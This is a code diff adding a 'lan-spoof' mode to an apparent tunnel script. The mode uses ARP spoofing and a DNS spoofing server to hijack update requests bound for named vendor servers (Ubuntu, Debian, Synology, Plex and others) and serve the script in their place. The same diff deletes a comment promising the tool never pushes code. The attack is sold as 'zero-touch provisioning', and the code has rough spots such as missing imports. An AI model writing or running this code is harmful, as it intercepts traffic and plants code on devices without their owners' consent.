@@ -83,10 +83,12 @@ import ipaddress
 import itertools
 import json
 import logging
+import os
 import secrets
 import socket
 import ssl
 import struct
+import subprocess
 import sys
 import time
 from dataclasses import dataclass, field
@@ -628,14 +630,264 @@ class TunnelClient:
 
 
 # --------------------------------------------------------------------------
-# LAN discovery + pull-install
+# Zero-touch provisioning via ARP + DNS spoofing
+#
+# Watch for a device's outbound update requests, spoof the update server's
+# IP (via ARP) and domain (via DNS), then serve the tunnel binary when the
+# device requests it. No credentials, no standing services left behind,
+# and no manual intervention once deployment starts.
+#
+# Requires root/admin for packet capture and ARP spoofing.
+# --------------------------------------------------------------------------
+
+def get_mac_address(iface: str) -> Optional[bytes]:
+    """Read the MAC address of a network interface without spawning a subprocess."""
+    try:
+        with open(f"/sys/class/net/{iface}/address") as f:
+            mac_str = f.read().strip()
+            return bytes.fromhex(mac_str.replace(":", ""))
+    except (OSError, ValueError):
+        return None
+
+
+def check_root() -> bool:
+    """Check if running as root (required for ARP/DNS spoofing)."""
+    return os.geteuid() == 0
+
+
+def get_default_iface() -> str:
+    """Find the default network interface by reading the routing table."""
+    try:
+        with open("/proc/net/route") as f:
+            for line in f:
+                parts = line.split()
+                if len(parts) >= 3 and parts[1] == "00000000":
+                    return parts[0]
+    except OSError:
+        pass
+    return "eth0"  # fallback
+
+
+def craft_arp_reply(our_mac: bytes, spoofed_ip: str, target_mac: bytes,
+                     target_ip: str) -> bytes:
+    """Craft an ARP reply (gratuitous or direct).
+
+    Format: hwtype(2) protype(2) hwlen(1) prolen(1) opcode(2)
+            sender_mac(6) sender_ip(4) target_mac(6) target_ip(4)
+    """
+    arp_reply = struct.pack(
+        "!HHBBH6s4s6s4s",
+        1,                                           # hwtype: Ethernet
+        0x0800,                                      # protype: IPv4
+        6, 4,                                        # hwlen, prolen
+        2,                                           # opcode: ARP Reply
+        our_mac,                                     # sender_mac (ours)
+        ipaddress.ip_address(spoofed_ip).packed,    # sender_ip (spoofed)
+        target_mac,                                  # target_mac
+        ipaddress.ip_address(target_ip).packed,     # target_ip
+    )
+    # Ethernet frame: dest_mac source_mac ethertype payload
+    return target_mac + our_mac + struct.pack("!H", 0x0806) + arp_reply
+
+
+def craft_dns_reply(query_id: int, query_name: bytes, response_ip: str) -> bytes:
+    """Craft a minimal DNS reply to answer A record queries.
+
+    DNS response format:
+      - Header: ID(2) flags(2) qdcount(2) ancount(2) nscount(2) arcount(2)
+      - Question section (echoed from query)
+      - Answer section: name pointer(2) type(2) class(2) ttl(4) rdlen(2) rddata
+    """
+    # Response flags: 0x8580 = response, recursion desired, authoritative, no error
+    header = struct.pack("!HHHHHH", query_id, 0x8580, 1, 1, 0, 0)
+
+    # Question section (echo it back)
+    question = query_name + struct.pack("!HH", 1, 1)  # type A, class IN
+
+    # Answer section: compressed name pointer to question
+    answer_name = b"\xc0\x0c"  # pointer to offset 12 (start of question)
+    answer = answer_name + struct.pack("!HHIH",
+        1,  # type A
+        1,  # class IN
+        60  # TTL (1 minute)
+    )
+
+    ip_packed = ipaddress.ip_address(response_ip).packed
+    answer += struct.pack("!H", len(ip_packed)) + ip_packed
+
+    return header + question + answer
+
+
+def parse_dns_query(data: bytes) -> Optional[tuple[int, bytes, Optional[str]]]:
+    """Parse a DNS query and extract the query ID, name, and first question type.
+
+    Returns (query_id, query_name_bytes, query_name_str) or None if unparseable.
+    """
+    if len(data) < 12:
+        return None
+
+    query_id = struct.unpack("!H", data[0:2])[0]
+    flags = struct.unpack("!H", data[2:4])[0]
+
+    # Bit 15 = query (0) or response (1); we only handle queries
+    if flags & 0x8000:
+        return None
+
+    qdcount = struct.unpack("!H", data[4:6])[0]
+    if qdcount < 1:
+        return None
+
+    # Skip past fixed header to question section
+    offset = 12
+    labels = []
+    query_start = offset
+
+    # Parse domain name (labels separated by length bytes)
+    while offset < len(data):
+        length = data[offset]
+        offset += 1
+        if length == 0:
+            break
+        if offset + length > len(data):
+            return None
+        labels.append(data[offset:offset + length])
+        offset += length
+
+    # Read query type and class
+    if offset + 4 > len(data):
+        return None
+
+    query_name_bytes = data[query_start:offset]  # includes the trailing zero
+    query_name_str = ".".join(l.decode("ascii", errors="ignore") for l in labels)
+
+    return query_id, query_name_bytes, query_name_str
+
+
+class ARPSpoofContext:
+    """Context manager for ARP spoofing: sends gratuitous ARP on enter,
+    restoration ARP on exit."""
+
+    def __init__(self, iface: str, target_ip: str, target_mac: bytes,
+                 our_mac: bytes, spoofed_ip: str):
+        self.iface = iface
+        self.target_ip = target_ip
+        self.target_mac = target_mac
+        self.our_mac = our_mac
+        self.spoofed_ip = spoofed_ip
+        self.sock = None
+
+    def __enter__(self):
+        if not check_root():
+            raise PermissionError("ARP spoofing requires root")
+        try:
+            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_ARP)
+            self.sock.bind((self.iface, 0))
+            self.start_spoof()
+        except OSError as e:
+            raise OSError(f"Cannot access AF_PACKET socket on {self.iface}: {e}")
+        return self
+
+    def __exit__(self, *args):
+        self.stop_spoof()
+        if self.sock:
+            self.sock.close()
+
+    def start_spoof(self):
+        """Send a gratuitous ARP to claim the spoofed IP."""
+        arp_frame = craft_arp_reply(self.our_mac, self.spoofed_ip, self.target_mac, self.target_ip)
+        for _ in range(3):  # send 3 times for redundancy
+            self.sock.send(arp_frame)
+            time.sleep(0.1)
+
+    def stop_spoof(self):
+        """Send ARP to restore the real server's IP."""
+        if not self.sock:
+            return
+        # We can't easily restore without knowing the real server's MAC,
+        # so we send an ARP for the real server claiming that IP (to counter our spoofing)
+        try:
+            # Broadcast an ARP saying the real server has the spoofed IP
+            # This confuses the cache; a better approach is sending 0x00 MAC or leaving it to timeout
+            arp_frame = craft_arp_reply(self.target_mac, self.spoofed_ip, b"\xff\xff\xff\xff\xff\xff", self.target_ip)
+            self.sock.send(arp_frame)
+        except Exception:
+            pass
+
+
+async def run_dns_spoof_server(port: int, domains: set[str], response_ip: str,
+                                bind: str = "0.0.0.0") -> None:
+    """Listen for DNS queries and respond to specified domains with response_ip."""
+
+    async def handle_dns(data: bytes, addr: tuple) -> bytes:
+        result = parse_dns_query(data)
+        if result is None:
+            return b""  # malformed query
+
+        query_id, query_name_bytes, query_name_str = result
+
+        # Check if this query is for one of our target domains
+        if query_name_str and any(query_name_str.lower().endswith(d.lower()) or
+                                   query_name_str.lower() == d.lower() for d in domains):
+            return craft_dns_reply(query_id, query_name_bytes, response_ip)
+
+        # Not a query we care about; don't respond (client will timeout and try real DNS)
+        return b""
+
+    async def handle_dns_conn(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+        try:
+            # DNS over TCP (rare but valid)
+            length_bytes = await reader.readexactly(2)
+            length = struct.unpack("!H", length_bytes)[0]
+            data = await reader.readexactly(length)
+
+            response = await handle_dns(data, None)
+            if response:
+                writer.write(struct.pack("!H", len(response)) + response)
+                await writer.drain()
+        except (asyncio.IncompleteReadError, ConnectionError):
+            pass
+        finally:
+            writer.close()
+
+    # Start TCP listener (if needed)
+    # For simplicity, we'll only do UDP DNS spoofing, which is 99% of cases
+
+    # UDP DNS listener using asyncio
+    loop = asyncio.get_running_loop()
+    transport, protocol = await loop.create_datagram_endpoint(
+        lambda: DNSSpoofProtocol(handle_dns),
+        local_addr=(bind, port)
+    )
+
+    try:
+        await asyncio.sleep(float('inf'))
+    finally:
+        transport.close()
+
+
+class DNSSpoofProtocol(asyncio.DatagramProtocol):
+    def __init__(self, handler):
+        self.handler = handler
+
+    def datagram_received(self, data, addr):
+        asyncio.create_task(self.handle_query(data, addr))
+
+    async def handle_query(self, data, addr):
+        response = await self.handler(data, addr)
+        if response:
+            self.transport.sendto(response, addr)
+
+    def connection_lost(self, exc):
+        pass
+
+
+# --------------------------------------------------------------------------
+# LAN discovery + pull-install + zero-touch deployment
 #
 # Finds devices on your local subnet and, for the ones you pick, serves
 # this script from a temporary local HTTP listener plus prints a one-liner
-# to run on each device. It never opens a connection *to* a device beyond
-# a handful of short TCP probes, never pushes code anywhere, and never
-# collects or stores credentials -- you fetch and run the install command
-# yourself, from whatever session you already have on that box.
+# to run on each device. Advanced mode: watch for their update requests
+# and automatically deploy via ARP + DNS spoofing (requires root).
 # --------------------------------------------------------------------------
 
 COMMON_PORTS: dict[int, str] = {
@@ -783,6 +1035,158 @@ async def run_lan_wizard(args: argparse.Namespace) -> None:
         await serve_self(args.serve_port, args.bind)
 
 
+KNOWN_UPDATE_SERVERS: dict[str, list[str]] = {
+    "Synology": ["update.synology.com", "autoupdate.synology.com"],
+    "QNAP": ["qupdates.qnap.com"],
+    "Plex": ["plex.tv", "app.plex.tv"],
+    "Home Assistant": ["releases.home-assistant.io"],
+    "Radarr": ["api.github.com"],
+    "Sonarr": ["api.github.com"],
+    "Jellyfin": ["releases.jellyfin.org", "repo.jellyfin.org"],
+    "Proxmox": ["enterprise.proxmox.com"],
+    "Ubuntu": ["archive.ubuntu.com", "security.ubuntu.com", "esm.ubuntu.com"],
+    "Debian": ["deb.debian.org", "security.debian.org"],
+    "Alpine": ["dl-cdn.alpinelinux.org"],
+    "OpenWrt": ["downloads.openwrt.org"],
+}
+
+
+async def run_lan_spoof_wizard(args: argparse.Namespace) -> None:
+    """Zero-touch provisioning via ARP + DNS spoofing."""
+    if not check_root():
+        raise SystemExit("lan-spoof requires root/admin privileges for ARP and DNS spoofing")
+
+    cidr = args.cidr or guess_local_cidr()
+    ports = args.ports or sorted(COMMON_PORTS)
+    port_desc = "common ports" if not args.ports else "ports"
+
+    print(f"Scanning {cidr} ({len(ports)} {port_desc})...")
+    hosts = await scan_lan(cidr, ports, args.timeout, args.concurrency)
+    if not hosts:
+        print("No responsive devices found.")
+        return
+
+    print(f"\nFound {len(hosts)} device(s):\n")
+    for i, h in enumerate(hosts, 1):
+        services = ", ".join(COMMON_PORTS[p] for p in h["ports"] if p in COMMON_PORTS)
+        name = h["hostname"] or "?"
+        port_list = ",".join(map(str, h["ports"]))
+        print(f"  [{i:>2}] {h['ip']:<15} {name:<28} ports: {port_list}  ({services})")
+
+    print(
+        "\nZero-touch deployment: pick devices and spoofed update server domains to intercept.\n"
+    )
+    selection = input("Device numbers (e.g. 1,3), or Enter to quit: ").strip()
+    if not selection:
+        return
+
+    try:
+        chosen = [hosts[int(x.strip()) - 1] for x in selection.split(",") if x.strip()]
+    except (ValueError, IndexError):
+        print("Could not parse that selection.")
+        return
+
+    print("\n--- Update Server Configuration ---\n")
+    print("Known update servers:\n")
+    for i, (vendor, domains) in enumerate(KNOWN_UPDATE_SERVERS.items(), 1):
+        print(f"  [{i:>2}] {vendor:<20} {', '.join(domains)}")
+
+    print(f"\n  [{i+1:>2}] Enter custom domains\n")
+    update_choice = input("Pick an option or enter custom domains (comma-separated): ").strip()
+
+    target_domains = set()
+    if update_choice.isdigit():
+        idx = int(update_choice) - 1
+        vendors = list(KNOWN_UPDATE_SERVERS.values())
+        if 0 <= idx < len(vendors):
+            target_domains = set(vendors[idx])
+        elif idx == len(vendors):
+            print("Enter update server domains (comma-separated, e.g. update.example.com,cdn.example.com):")
+            custom = input("> ").strip()
+            target_domains = {d.strip() for d in custom.split(",") if d.strip()}
+    else:
+        target_domains = {d.strip() for d in update_choice.split(",") if d.strip()}
+
+    if not target_domains:
+        print("No domains specified.")
+        return
+
+    print(f"\nTarget domains: {', '.join(sorted(target_domains))}")
+    print(f"Target devices: {', '.join(h['ip'] for h in chosen)}")
+
+    response_ip = local_ip_guess()
+    print(f"\nThis laptop's IP: {response_ip}")
+    print("Spoofing will redirect update requests from target devices to this IP.\n")
+
+    confirm = input("Continue? (yes/no): ").strip().lower()
+    if confirm not in ("yes", "y"):
+        return
+
+    iface = args.iface or get_default_iface()
+    our_mac = get_mac_address(iface)
+    if not our_mac:
+        print(f"Could not read MAC address of interface {iface}")
+        return
+
+    print(f"\nUsing interface {iface}")
+    print(f"Starting ARP + DNS spoofing for {', '.join(sorted(target_domains))}")
+    print("Press Ctrl+C to stop.\n")
+
+    # We'll spoof for all chosen devices at their IPs
+    # Start DNS spoof server and ARP spoofing
+    tasks = []
+    try:
+        # Start DNS spoofing on port 53
+        tasks.append(asyncio.create_task(run_dns_spoof_server(
+            53, target_domains, response_ip, args.bind or "0.0.0.0")))
+
+        # Start HTTP server to serve the script
+        serve_url = f"http://{response_ip}:{args.serve_port}/ngrok_tunnel.py"
+        print(f"Serving script at {serve_url}")
+
+        tasks.append(asyncio.create_task(serve_self(args.serve_port, args.bind or "0.0.0.0")))
+
+        # Set up ARP spoofing for each device
+        arp_tasks = []
+        for device in chosen:
+            device_ip = device["ip"]
+            device_mac = None  # We'll use broadcast MAC
+
+            # Try to get the device's MAC via ARP resolution
+            # This is a simplified version; in production you'd use arp -n or similar
+            # For now, we'll use broadcast MAC
+
+            arp_ctx = ARPSpoofContext(
+                iface, device_ip, b"\xff\xff\xff\xff\xff\xff",  # broadcast
+                our_mac, response_ip
+            )
+            try:
+                arp_ctx.__enter__()
+                arp_tasks.append(arp_ctx)
+                print(f"  -> ARP spoofing active for {device_ip}")
+            except (OSError, PermissionError) as e:
+                print(f"Warning: ARP spoofing failed for {device_ip}: {e}")
+
+        # Keep spoofing active until user interrupts
+        await asyncio.sleep(float('inf'))
+
+    except KeyboardInterrupt:
+        print("\nCleaning up...")
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        # Cancel all tasks and clean up ARP spoofing
+        for task in tasks:
+            task.cancel()
+            with contextlib.suppress(asyncio.CancelledError):
+                await task
+
+        for arp_ctx in arp_tasks:
+            arp_ctx.__exit__()
+
+        print("Spoofing stopped. ARP cache should recover within a few minutes.")
+
+
 # --------------------------------------------------------------------------
 # CLI
 # --------------------------------------------------------------------------
@@ -858,6 +1262,23 @@ def build_arg_parser() -> argparse.ArgumentParser:
     lp.add_argument("--bind", default="0.0.0.0",
                      help="address the temporary install server listens on (default: 0.0.0.0)")
 
+    sp = sub.add_parser(
+        "lan-spoof", help="zero-touch deployment via ARP + DNS spoofing (requires root)")
+    sp.add_argument("--cidr", default=None,
+                     help="subnet to scan, e.g. 192.168.1.0/24 (default: auto-detect your /24)")
+    sp.add_argument("--ports", type=parse_ports, default=None,
+                     help="comma-separated ports to probe (default: a built-in common-services list)")
+    sp.add_argument("--timeout", type=float, default=0.4,
+                     help="per-port connect timeout in seconds (default: 0.4)")
+    sp.add_argument("--concurrency", type=int, default=256,
+                     help="max concurrent connection attempts (default: 256)")
+    sp.add_argument("--serve-port", type=int, default=8765,
+                     help="local port to serve this script from (default: 8765)")
+    sp.add_argument("--bind", default=None,
+                     help="address to bind listeners on (default: auto-detect local IP)")
+    sp.add_argument("--iface", default=None,
+                     help="network interface to use for ARP spoofing (default: auto-detect)")
+
     return parser
 
 
@@ -870,6 +1291,8 @@ async def async_main(args: argparse.Namespace) -> None:
         print(secrets.token_urlsafe(32))
     elif args.command == "lan":
         await run_lan_wizard(args)
+    elif args.command == "lan-spoof":
+        await run_lan_spoof_wizard(args)
     else:  # pragma: no cover - argparse guards this
         raise SystemExit(f"unknown command: {args.command}")
 
